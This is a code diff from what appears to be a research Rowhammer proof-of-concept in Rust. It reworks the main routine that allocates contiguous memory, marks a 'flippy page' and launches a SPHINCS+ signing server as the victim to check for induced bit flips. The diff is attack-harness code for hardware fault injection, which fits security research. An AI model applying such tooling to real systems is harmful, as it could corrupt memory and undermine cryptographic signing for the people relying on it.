@@ -4,18 +4,13 @@ use anyhow::bail;
 use bs_poc::{
     allocator::{util::mmap, ConsecAllocator, Pfn, Spoiler},
     hammerer::blacksmith::blacksmith_config::BlacksmithConfig,
-    memory::{
-        find_flippy_page, mem_configuration::MemConfiguration, BytePointer, ConsecBlocks, MemBlock,
-        PfnResolver,
-    },
+    memory::{mem_configuration::MemConfiguration, BytePointer, ConsecBlocks, MemBlock},
     util::{KB, MB},
-    victim::{
-        sphincs_plus::SphincsPlus, HammerVictim, HammerVictimError, InjectionConfig, PageInjector,
-    },
+    victim::{sphincs_plus::SphincsPlus, HammerVictim, HammerVictimError},
 };
 use clap::{arg, Parser};
 use indicatif::MultiProgress;
-use log::{debug, info, warn};
+use log::{info, warn};
 
 /// CLI arguments for the `hammer` binary.
 ///
@@ -53,7 +48,6 @@ enum AllocStrategy {
 
 fn main() -> anyhow::Result<()> {
     env_logger::init();
-    const PAGE_SIZE: usize = 4096;
     //const NUM_PAGES: usize = 1 << 21; // 8 GB
     //const ALLOC_SIZE: usize = NUM_PAGES * PAGE_SIZE;
     let args = CliArgs::parse();
@@ -89,22 +83,11 @@ fn main() -> anyhow::Result<()> {
                     }
                 };
                 let flippy_page = unsafe { x.ptr().byte_add(64 * KB) as *mut libc::c_void };
-                debug!("Collecting PFNs...");
-                let target_pfn = flippy_page.pfn()? >> 12;
-                //x.log_pfns();
-                debug!("PFNs collected");
 
-                info!("PFN: {:?}", flippy_page.pfn());
                 info!("Launching victim");
-                let injector = PageInjector::new(InjectionConfig {
-                    flippy_page,
-                    flippy_page_size: PAGE_SIZE,
-                    bait_count_after: bait_after,
-                    bait_count_before: bait_before,
-                });
                 let mut victim = match SphincsPlus::new(
                     "/home/jb/sphincsplus/ref/test/server".to_string(),
-                    injector,
+                    vec![flippy_page as usize],
                 ) {
                     Ok(v) => v,
                     Err(e) => {
@@ -113,22 +96,24 @@ fn main() -> anyhow::Result<()> {
                         continue;
                     }
                 };
+                victim.start();
                 victim.init();
                 let output = match victim.check() {
                     Ok(output) => output,
                     Err(HammerVictimError::NoFlips) => todo!("No flips detected"),
                     Err(HammerVictimError::IoError(e)) => todo!("IO error: {:?}", e),
+                    Err(HammerVictimError::NotRunning) => todo!("Victim not running"),
                 };
                 //if output.contains(&format!("{:x}", target_pfn)) {
                 //    bail!("YES MAN: {},{}", bait_before, bait_after);
                 //}
-                let flippy_page = find_flippy_page(target_pfn, victim.pid())?;
+                /*let flippy_page = find_flippy_page(target_pfn, victim.pid())?;
                 if let Some(flippy_region) = &flippy_page {
                     info!("Flippy page reused in region {:?}", flippy_region);
                 } else {
                     warn!("Flippy page not reused");
                 }
-                println!("{:?}", flippy_page);
+                println!("{:?}", flippy_page);*/
                 info!("Hammering result:\n{:?}", output);
                 victim.stop();
                 x.dealloc();
